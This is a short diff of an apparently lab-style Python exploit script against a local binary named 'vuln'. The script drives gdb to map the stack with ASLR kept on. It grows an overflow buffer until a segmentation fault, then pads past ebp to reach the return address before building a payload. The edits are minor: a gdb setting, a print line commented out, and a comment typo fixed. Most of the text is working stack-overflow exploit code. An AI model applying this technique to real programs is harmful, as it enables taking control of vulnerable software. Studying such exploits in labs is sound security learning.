@@ -15,6 +15,7 @@ open("trash", "wb").write(trash)
 #then call gdb to find in what adresses the stack fluctuates -> info proc mapping
 gdb_process = subprocess.Popen(['gdb', 'vuln'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 commands = """
+set disable-randomization off
 b vuln
 r `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`
 info proc mapping
@@ -26,7 +27,7 @@ output, errors = gdb_process.communicate(commands)
 # Find the line containing the word "stack" and extract the address in the middle
 output_lines = output.split('\n')
 stack_line = next((line for line in output_lines if 'stack' in line), None)
-print(stack_line)
+# print(stack_line)
 if(stack_line == None):
     print("gdb failed.")
     sys.exit(1)
@@ -45,7 +46,7 @@ while True:
 
     if vuln_proc.returncode == -11:
         print(f"Segmentation fault occurred with buffer length: {len(overflow)}")
-        #not sure why the program crashes at 136 bytes length, will add 4 bytes to the buffer to cover ebp and reach the returd address location. Must change!
+        #not sure why the program crashes at 136 bytes length, will add 4 bytes to the buffer to cover ebp and reach the return address location. Must change!
         overflow += b'A'*4
 
         #constructing the payload
